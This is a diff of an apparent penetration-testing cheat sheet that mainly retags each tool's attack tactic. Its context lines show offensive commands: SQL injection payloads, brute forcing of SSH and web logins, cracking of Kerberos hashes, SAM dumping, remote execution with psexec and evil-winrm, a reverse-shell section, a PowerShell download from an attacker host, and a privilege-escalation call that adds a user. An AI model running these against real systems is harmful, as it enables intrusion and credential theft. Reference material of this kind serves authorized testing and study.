@@ -191,7 +191,7 @@ for ip in $(seq 200 254); do echo 1.2.3.${ip}; done > target-ip.txt
 
 # ldapsearch
 - service: ldap
-- tactics: enumeration
+- tactics: discovery
 
 `ldapsearch -x -h target-ip -b "dc=domain,dc=tld"`
 
@@ -199,7 +199,7 @@ for ip in $(seq 200 254); do echo 1.2.3.${ip}; done > target-ip.txt
 
 # windapsearch.py
 - service: ldap
-- tactics: enumeration
+- tactics: discovery
 
 # 
 - `./windapsearch.py -d host.domain.tld -u domain\\ldapbind -p password -U`
@@ -208,8 +208,7 @@ for ip in $(seq 200 254); do echo 1.2.3.${ip}; done > target-ip.txt
 
 # evil-winrm
 - service: winrm
-- tactics: enumeration
-- tactics: inital_access
+- tactics: lateral_movement
 
 # get shell via evil-winrm
 - `./evil-winrm.rb -u username -p password -i target-ip`
@@ -220,7 +219,7 @@ for ip in $(seq 200 254); do echo 1.2.3.${ip}; done > target-ip.txt
 - service: smtp
 - service: pop
 - serivce: telnet
-- tactics: enumeration
+- tactics: collection
 
 ## send mail via telnet
 
@@ -321,7 +320,7 @@ Connection: close
 
 # mysqldump
 - service: sql
-- tactics: enumeration
+- tactics: initial_access
 
 ## backup all mysql databases
 - `mysqldump -u username -ppassword --all-databases --single-transaction`
@@ -331,9 +330,7 @@ Connection: close
 # sqli
 - service: sql
 - service: http
-- tactics: enumeration
 - tactics: inital_access
-- tactics: exfiltration
 
 ## check if you can find a row, where you can place your output  
 - `http://target-ip/inj.php?id=1 union all select 1,2,3,4,5,6,7,8`
@@ -447,7 +444,7 @@ After the tunnel is up, you can comment out the first socks entry in proxychains
 
 # smbmap
 - service: smb
-- tactics: inital_access
+- tactics: discovery
 
 ## guest login
 - `smbmap -u whateverusername -H target-ip`
@@ -491,7 +488,7 @@ After the tunnel is up, you can comment out the first socks entry in proxychains
 
 # vinagre
 - service: vnc
-- tactics: inital_access
+- tactics: lateral_movement
 
 # vnc connect
 - `vinagre`
@@ -501,7 +498,7 @@ After the tunnel is up, you can comment out the first socks entry in proxychains
 # medusa
 - service: http
 - service: basic_auth
-- tactics: defense_evasion
+- tactics: credential_access
 
 ## bruteforce basic_auth
 - `medusa -h target-ip -U ../creds/usernames.txt -P ../creds/passwords.txt -M http -m DIR:/printers -T 10`
@@ -512,7 +509,7 @@ After the tunnel is up, you can comment out the first socks entry in proxychains
 - service: http
 - service: http_post
 - service: sql
-- tactics: defense_evasion
+- tactics: credential_access
 
 ## bruteforce http_post with example post-data
 - `hydra -l root@localhost -P /usr/share/wordlists/rockyou.txt target-ip http-post-form "/otrs/index.pl:Action=Login&RequestedURL=&Lang=en&TimeOffset=-60&User=^USER^&Password=^PASS^:
@@ -525,7 +522,7 @@ Login failed!"`
 
 # patator
 - service: ssh
-- tactics: defense_evasion
+- tactics: credential_access
 
 ## bruteforce ssh
 - `patator ssh_login host=target-ip port=22 user=username password=FILE0 0=/opt/SecLists/Passwords/probable-v2-top1575.txt`
@@ -534,6 +531,8 @@ Login failed!"`
 ---
 
 # burp
+- service: http
+- tactics: enumeration
 
 ## bypass ip blacklist / whitelist
 - `X-Forwarded-For: $allowed-ip`
@@ -583,7 +582,7 @@ Login failed!"`
 
 # mssqlclient.py
 - service: sql
-- tactics: inital_access
+- tactics: lateral_movement
 - suites: impacket
 
 ## connect to windows mssql Server
@@ -593,7 +592,7 @@ Login failed!"`
 
 # mssql-cli
 - service: sql
-- tactics: inital_access
+- tactics: lateral_movement
 
 ## connect to windows mssql Server
 - `mssql-cli -S target-ip -U username`
@@ -614,7 +613,7 @@ Login failed!"`
 
 # getnpusers.py
 - service: kerberos
-- tactics: inital_access
+- tactics: credential_access
 - tactics: lateral_movement
 
 ## check ASREPRoast for all domain users (credentials required)
@@ -633,7 +632,7 @@ Login failed!"`
 
 # hashcat
 - service: all
-- tactics: defense_evasion
+- tactics: credential_access
 
 ## crack as_rep_response_file (asreproast)
 - `hashcat -m 18200 -a 0 as_rep_response_file passwords_file`
@@ -645,7 +644,7 @@ Login failed!"`
 
 # john
 - service: all
-- tactics: defense_evasion
+- tactics: credential_access
 
 ## crack as_rep_response_file (asreproast)
 - `john --wordlist=passwords_file as_rep_response_file`
@@ -664,7 +663,7 @@ Login failed!"`
 
 # secretsdump.py
 - service: kerberos
-- tactics: defense_evasion
+- tactics: credential_access
 - suites: impacket
 
 ## dcsync
@@ -674,7 +673,7 @@ Login failed!"`
 
 # invoke-kerberoast.ps1
 - service: kerberos
-- tactics: defense_evasion
+- tactics: credential_access
 - suites: powershell_empire
 
 ## execute invoke-kerberoast.ps1
@@ -684,7 +683,7 @@ Login failed!"`
 
 # gettgt.py
 - service: kerberos
-- tactics: lateral_movement
+- tactics: credential_access
 - suites: impacket
 
 ## overpass the hash
@@ -708,7 +707,7 @@ Login failed!"`
 
 # ticket_converter.py
 - service: kerberos
-- tactics: weaponization
+- tactics: credential_access
 
 ## convert tickets between linux / windows format
 [ticket_converter.py](https://github.com/Zer1t0/ticket_converter):
@@ -723,7 +722,7 @@ Login failed!"`
 
 # mimikatz
 - service: kerberos
-- tactics: lateral_movement
+- tactics: credential_access
 
 ## enable log
 - `log filename.log`
@@ -770,7 +769,7 @@ Login failed!"`
 ---
 # ticketer.py
 - service: kerberos
-- tactics: weaponization
+- tactics: credential_access
 - suites: impacket
 
 ## silver_ticket
@@ -801,7 +800,7 @@ Login failed!"`
 
 # psexec.py
 - service: rpc
-- tactics: inital_access
+- tactics: lateral_movement
 - suites: impacket
 
 ## Execute remote commands with any of the following by using the TGT
@@ -810,7 +809,7 @@ Login failed!"`
 ---
 # smbexec.py
 - service: smb
-- tactics: inital_access
+- tactics: lateral_movement
 - suites: impacket
 
 ## Execute remote commands with any of the following by using the TGT
@@ -820,7 +819,7 @@ Login failed!"`
 
 # wmiexec.py
 - service: wmi
-- tactics: inital_access
+- tactics: lateral_movement
 - suites: impacket
 
 ## Execute remote commands with any of the following by using the TGT
@@ -830,7 +829,7 @@ Login failed!"`
 
 # psexec.exe
 - service: smb
-- tactics: inital_access
+- tactics: lateral_movement
 - suites: pstools
 
 ## run psexec
@@ -882,7 +881,7 @@ return 0;
 
 # reg.exe
 - service: sam
-- tactics: defense_evasion
+- tactics: credential_access
 
 ## dump sam database
 - `reg save HKLM\sam sam`
@@ -897,16 +896,9 @@ return 0;
 
 ---
 
-# plink.exe
-
-## Port forward using plink
-- `plink.exe -l username -pw password target-ip -R 8080:127.0.0.1:8080`
-
----
-
 # samdump2
 - service: sam
-- tactics: defense_evasion
+- tactics: credential_access
 
 - `samdump2 SYSTEM SAM > hashes.db`
 
@@ -914,16 +906,25 @@ return 0;
 
 # unshadow
 - service: sam
-- tactics: defense_evasion
+- tactics: credential_access
 
 ## unshadow /etc/passwd file
 - `unshadow shadow passwd > unshadow.db`
 
 ---
 
+# plink.exe
+- service: all
+- tactics: lateral_movement
+
+## Port forward using plink
+- `plink.exe -l username -pw password target-ip -R 8080:127.0.0.1:8080`
+
+---
+
 # socat
 - serivce: all
-- tactics: inital_access
+- tactics: command_and_control
 
 # reverse_shell
 ## attacker
@@ -950,6 +951,8 @@ return 0;
 ---
 
 ## powershell
+- serivce: windows
+- tactics: execution
 
 ### powershell upload
 - `powershell Invoke-WebRequest "http://attacker-ip:81/x41.csproj" -OutFile "C:\ProgramData\x41.csproj"`
@@ -961,6 +964,8 @@ return 0;
 ---
 
 # potato.exe
+- serivce: windows
+- tactics: privilege_escalation
 
 ## hot potato usage
 - `potato.exe -ip <local ip> -cmd "c:\\windows\\system32\\cmd.exe /K net users username password /add" -disable_exhaust true`
@@ -968,6 +973,8 @@ return 0;
 ---
 
 # Metasploit
+- serivce: all
+- tactics: command_and_control
 
 ## Port forward using meterpreter
 - `portfwd add -l <attacker port> -p <victim port> -r <victim ip>`
